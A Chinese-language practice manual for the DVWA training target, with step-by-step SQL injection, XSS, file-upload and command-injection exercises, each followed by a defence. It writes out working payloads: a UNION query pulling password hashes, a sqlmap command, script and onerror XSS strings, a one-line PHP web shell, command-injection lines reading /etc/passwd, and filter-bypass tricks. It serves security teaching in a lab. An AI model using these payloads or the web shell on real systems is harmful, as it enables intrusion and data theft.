# 渗透实验手册：DVWA 四类漏洞（照做就能通关）

> 只在 DVWA 这类自己的靶场里做。本手册所有 payload 只用于靶场。

## 0. 环境准备（一次配好）

方式一（推荐，Docker）：
```
docker run --rm -it -p 80:80 vulnerables/web-dvwa
```
浏览器打开 http://127.0.0.1 → 进 /setup.php → 点 Create/Reset Database。

方式二（XAMPP）：下载 DVWA 源码解压到 htdocs/dvwa，改 config.inc.php 里的密码，同样走 /setup.php。

登录：账号 `admin`，密码 `password`。
第一件事：左边栏 DVWA Security → 调到 **Low**。

## 1. SQL Injection

**目标**：不用密码查出全部用户。

手注三步：
1. 输入框填 `'` 回车 → 报错 = 有注入点（不报错也没事，继续）
2. 填 `' OR '1'='1` → 出现全部用户信息 = 登录条件被绕开
3. 进阶（union 注入）：填 `1' UNION SELECT user,password FROM users#`
   → 直接拖出账号密码哈希

工具版（sqlmap，先按 F12 拿 cookie）：
```
sqlmap -u "http://127.0.0.1/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=你的会话" --dbs
```

**原理一句话**：输入被直接拼进 SQL，引号把原语句截断，后面跟着攻击者自己的 SQL。
**怎么防**：参数化查询（预编译语句），永远不拼字符串。

## 2. XSS

反射型（/vulnerabilities/xss_r/）：
输入 `<script>alert(document.cookie)</script>` → 弹窗显示 cookie = 成功。

存储型（/vulnerabilities/xss_s/）：
在留言框输入 `<script>alert(1)</script>` → 之后每次有人打开页面都弹 = 成功（存在数据库里）。

**原理一句话**：页面把用户输入当代码执行了，反射型"一次性"，存储型"永久生效"。
**怎么防**：输出编码（把 `<` 变成 `&lt;`）、CSP 策略。

## 3. File Upload

**目标**：传一个网页木马上去。

1. 新建 `shell.php`，内容：`<?php echo shell_exec($_GET['cmd']); ?>`
2. Low 难度直接上传（不限类型）
3. 访问 `http://127.0.0.1/hackable/uploads/shell.php?cmd=whoami` → 回显 www-data = 成功
4. 再用 `?cmd=ls -la /` 看根目录

**原理一句话**：服务器没检查文件类型，php 文件被执行成代码。
**怎么防**：校验类型+内容、重命名、上传目录禁执行、最小权限。

## 4. Command Injection

**目标**：让 ping 命令后面执行你的命令。

在输入框依次试（填目标 IP 那栏）：
```
127.0.0.1; whoami
127.0.0.1 | ls -la
127.0.0.1 && cat /etc/passwd
```
回显里出现额外命令结果 = 成功。

**原理一句话**：程序把输入直接拼进 shell 命令，`;` `|` `&&` 用来接第二条命令。
**怎么防**：白名单校验 IP 格式、不拼字符串、不直接调 shell。

## 5. 通关后：调 Medium 再来一遍

把难度调 Medium，观察每关**过滤了什么**：

- SQL：输入框变成下拉数字 → 用 Burp 抓包改 id 再测
- XSS：`<script>` 被过滤 → 试 `<img src=x onerror=alert(1)>`
- 上传：检查 Content-Type → 用 Burp 把 `Content-Type` 改成 `image/jpeg` 再传
- 命令注入：`&&` `;` 被过滤 → 试 `|`

**这一遍比 Low 值钱**——你学的不再是 payload，是"绕过思路"。

## 常见坑

- 中文乱码：浏览器编码或改 db 配置，不影响实验
- sqlmap 扫不到：多半是 cookie 没带或难度没切 Low
- 上传后 404：确认目录拼对（DVWA 上传目录是 hackable/uploads）
- 改了代码没生效：重启 docker/XAMPP 的 Apache

## 完成标准

四关 Low + 四关 Medium 全通，且每关能说出"原理一句话"和"怎么防"。截图存档，写进打卡。
